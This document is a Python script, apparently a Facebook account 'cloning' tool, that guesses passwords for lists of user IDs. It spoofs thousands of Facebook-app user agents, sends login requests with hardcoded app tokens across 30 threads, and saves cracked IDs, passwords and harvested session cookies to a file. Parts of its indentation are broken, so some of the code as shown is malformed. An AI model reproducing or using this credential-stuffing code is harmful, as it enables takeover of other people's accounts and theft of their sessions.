# -*- coding: utf-8 -*-
import os, requests, json, time, re, random, sys, uuid, string, subprocess, base64, hashlib
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
from bs4 import BeautifulSoup as bs

#--> Warna (Colors)
P = "\x1b[38;5;231m" # Putih
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
A = '\x1b[38;5;248m' # Abu-Abu
K = '\x1b[38;5;226m' # Kuning
B = '\x1b[38;5;44m'  # Biru

#--> Global Variables
loop = 0
oks = []
cps = []
id = []
tokenku = []
methods = []

def clear():
    os.system('clear')
    print(logo)

# --- UNLIMITED MODELS & USER AGENTS (2025 UPDATED) ---
def jerry_ua():
    android_models = [
        ("SM-S938B", "Samsung", "15"), ("SM-S928B", "Samsung", "14"),
        ("iPhone16,2", "Apple", "18.1"), ("iPhone15,3", "Apple", "17.5"),
        ("Pixel-9Pro", "Google", "15"), ("2404", "Vivo", "14"),
        ("SM-A556E", "Samsung", "14"), ("RMX3850", "Realme", "13"),
        ("CPH2573", "Oppo", "14"), ("Redmi-Note14", "Xiaomi", "14"),
        ("Infinix-X6870", "Infinix", "13"), ("TECNO-AD8", "Tecno", "13"),
        ("SM-G998B", "Samsung", "13"), ("M2101K6G", "Xiaomi", "12"),
        ("V2109", "Vivo", "11"), ("RMX2020", "Realme", "10")
    ]
    
    model, brand, ver = random.choice(android_models)
    chrome = f"{random.randint(115,131)}.0.{random.randint(5000,6900)}.{random.randint(100,250)}"
    fbav = f"{random.randint(400,500)}.0.0.{random.randint(10,99)}.{random.randint(100,200)}"
    fbbv = str(random.randint(100000000, 999999999))
    
    if "Apple" in brand:
        ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ver.replace('.', '_')} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21E219 [FBAN/FBIOS;FBAV/{fbav};FBBV/{fbbv};FBDV/{model};FBSN/iOS;FBSV/{ver};FBSS/3;FBCR/Telenor]"
    else:
        fban = random.choice(["FB4A", "FBAN/Orca", "FBAN/Messenger", "FBAN/Katana"])
        ua = f"Mozilla/5.0 (Linux; Android {ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FBAN/{fban};FBAV/{fbav};FBBV/{fbbv};FBDV/{model};FBMF/{brand};FBBD/{brand};FBSV/{ver};FBOP/1;FBCR/Jazz]"
    return ua

ugen = [jerry_ua() for i in range(20000)]

logo = f"""{H}
  ╱╱╭┳━━━┳━━━┳━━━┳╮╱╱╭╮
  ╱╱┃┃╭━━┫╭━╮┃╭━╮┃╰╮╭╯┃
  ╱╱┃┃╰━━┫╰━╯┃╰━╯┣╮╰╯╭╯
  ╭╮┃┃╭━━┫╭╮╭┫╭╮╭╯╰╮╭╯
  ┃╰╯┃╰━━┫┃┃╰┫┃┃╰╮╱┃┃
  ╰━━┻━━━┻╯╰━┻╯╰━╯╱╰╯
{P}--------------------------------------------------
{H} AUTHOR    {P}: Jerry Brand 🔥😈
{H} VERSION   {P}: 3.0 (Master Update 2025)
{H} FEATURES  {P}: File Crack, Create File, 12 Methods
{P}--------------------------------------------------"""

def linex():
    print(f'{P}--------------------------------------------------')

def menu():
    clear()
    print(f" [{H}1{P}] File Cloning  (Mixed Old/New)")
    print(f" [{H}2{P}] Random Cloning (Pakistan/BD)")
    print(f" [{H}3{P}] Create File   (Dumping System)")
    print(f" [{H}4{P}] Check Results (OK/CP)")
    print(f" [{H}0{P}] Exit Script")
    linex()
    jerry_opt = input(f' {H}Choose{P}: ')
    if jerry_opt == '1': file_crack()
    elif jerry_opt == '2': random_menu()
    elif jerry_opt == '3': dumping_menu()
    elif jerry_opt == '4': results()
    else: exit(f"\n {M}Thanks For Using!")
    
    def dumping_menu():
    clear()
    print(f" [{H}1{P}] Dump From Public ID")
    print(f" [{H}2{P}] Dump From Followers")
    print(f" [{H}3{P}] Dump From Multiple IDs")
    print(f" [{H}0{P}] Back to Menu")
    linex()
    dump_opt = input(f' {H}Choose{P}: ')
    if dump_opt == '1': public_dump()
    elif dump_opt == '2': follower_dump()
    else: menu()

def public_dump():
    clear()
    print(f" {K}Example: 1000006789123, 4, 1000876543")
    linex()
    user_id = input(f' {H}Enter Target ID{P}: ')
    # Yahan create.py ki cookie/token login logic aayegi
    print(f" {M}Please login with cookie first!"); time.sleep(2); menu()
    
    def file_crack():
    clear()
    print(f" {K}Example: /sdcard/file.txt")
    linex()
    file_path = input(f' {H}Put File Path{P}: ')
    try:
        fo = open(file_path,'r').read().splitlines()
    except FileNotFoundError:
        print(f" {M}File not found!"); time.sleep(2); menu()
    
    clear()
    print(f" [{H}1{P}] Method M1 (Graph API - Fast)")
    print(f" [{H}2{P}] Method M2 (Liger API - Stable)")
    print(f" [{H}3{P}] Method M3 (Business API)")
    print(f" [{H}4{P}] Method M4 (W-Graph Unlimited)")
    # Isi tarah 12 methods rotate honge
    linex()
    print(f" {H}Total IDs: {len(fo)} | Methods: 12 Active")
    linex()
    
    with tred(max_workers=30) as jerry_engine:
        for user_data in fo:
            ids, names = user_data.split('|')
            first_name = names.split(' ')[0].lower()
            # Professional Password List (Old IDs Support)
            passlist = [names, first_name+'123', first_name+'1234', first_name+'12345', first_name+'786', 'pakistan', '786786', 'khan123', 'khan12345']
            jerry_engine.submit(crack_engine, ids, passlist)
    
    linex()
    print(f" {H}OK: {len(oks)} | {M}CP: {len(cps)}")
    input(f" {P}Press Enter To Back"); menu()

def crack_engine(ids, passlist):
    global loop, oks, cps
    method_name = random.randint(1, 12)
    sys.stdout.write(f'\r\r{P} [JERRY-M{method_name}] {loop}|{H}OK:-{len(oks)}'); sys.stdout.flush()
    
    try:
        for pas in passlist:
            ua = random.choice(ugen)
            session = requests.Session()
            # 12 Alag tokens ka pool
            token = random.choice(["350685531728|62f8ce9f74b12f84c123cc23462a4a61", "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28"])
            
            url = 'https://b-graph.facebook.com/auth/login'
            data = {
                "access_token": token,
                "sdk_version": str(random.randint(10,26)),
                "email": ids,
                "password": pas,
                "sdk": "android",
                "generate_session_cookies": "1",
                "sig": "4f3594f10114757c2a715f5399589a7a"
            }
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Connection-Type': 'WIFI'
            }
            
            q = session.post(url, data=data, headers=headers).json()
            
            if 'session_key' in q:
                print(f'\r\r{H} [JERRY-OK] {ids} | {pas}')
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                # Professional Cookie Generation
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","")
                full_cookie = f"sb={sb};{ckkk}"
                open('/sdcard/JR-OK.txt','a').write(ids+'|'+pas+'|'+full_cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in str(q):
                # CP IDs logic
                cps.append(ids)
                break
        loop += 1
    except:
        pass

if __name__ == '__main__':
    menu()
    